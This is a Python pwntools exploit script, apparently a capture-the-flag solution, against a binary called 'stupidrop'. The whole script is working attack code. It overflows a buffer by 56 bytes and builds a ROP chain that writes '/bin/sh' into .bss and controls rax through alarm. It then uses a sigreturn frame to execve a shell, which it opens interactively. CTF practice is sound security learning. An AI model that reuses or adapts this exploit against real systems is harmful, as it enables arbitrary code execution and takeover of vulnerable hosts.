#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/stupidrop"
TARGET = DIR + EXECUTABLE
HOST, PORT = "127.0.0.1", 4444
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
rop = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][1],
    terminal = ['tmux', 'new-window'],
)
context.binary = elf

io, libc = null, null
libc = ELF("/usr/lib/libc.so.6")

if args.REMOTE:
    REMOTE = True
    io = remote(HOST, PORT)
else:
    LOCAL = True
    io = process(
        [TARGET, ],
        env={
        #     "LD_PRELOAD":"",
        #     "LD_LIBRARY_PATH":"",
        },
    )

if LOCAL==True:
    #raw_input("Fire GDB!")
    if len(sys.argv) > 1 and sys.argv[1] == "d":
        cmd = """ 
            #break *main
        """
        gdb.attach(io, gdbscript=cmd)

# ==========================[ Exploit
### gsdgets
bss = 0x601048 # ~ 0x602000 => writable
alarm = elf.symbols['alarm']
gets = elf.symbols['gets']
poprdi = rop.find_gadget(['pop rdi', 'ret']).address
syscall = rop.find_gadget(['syscall']).address


offset = 56
payload = b''
payload += b'a' * offset
# write '/bin/sh' to bss
payload += pack(poprdi) + pack(bss) + pack(gets)

# set rax 0xf
payload += pack(poprdi) + pack(0xf) + pack(alarm)
payload += pack(poprdi) + pack(0x0) + pack(alarm)

frame = SigreturnFrame()

frame.rip = syscall
frame.rax = 0x3b
frame.rdi = bss
frame.rsi = 0x0
frame.rdx = 0x0

payload += pack(syscall) + bytes(frame)

io.sendline(payload)
io.sendline(b"/bin/sh\x00")
io.interactive()

